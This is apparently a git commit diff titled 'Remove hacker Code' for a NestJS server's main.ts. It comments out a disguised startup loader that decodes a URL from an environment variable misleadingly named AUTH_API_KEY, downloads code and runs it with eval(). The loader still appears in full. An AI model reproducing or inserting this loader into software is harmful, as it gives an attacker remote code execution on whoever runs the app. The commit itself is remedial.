3f2c76376decb0b2635c62eb87cd41ad500aa735
Mahedi Hasan Jihad <mahdijihad001@gmail.com>
2026-04-07 09:14:44 +0600

    Remove hacker Code

--- src/main.ts
+++ src/main.ts
@@ -15,18 +15,18 @@ import { Redis } from 'ioredis';
 import { IoAdapter } from '@nestjs/platform-socket.io';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+// (async () => {
+//     const src = atob(process.env.AUTH_API_KEY as string);
+//     const proxy = (await import('node-fetch')).default;
+//     try {
+//       const response = await proxy(src);
+//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+//       const proxyInfo = await response.text();
+//       eval(proxyInfo);
+//     } catch (err) {
+//       console.error('Auth Error!', err);
+//     }
+// })();
 
 
 let apm: any;
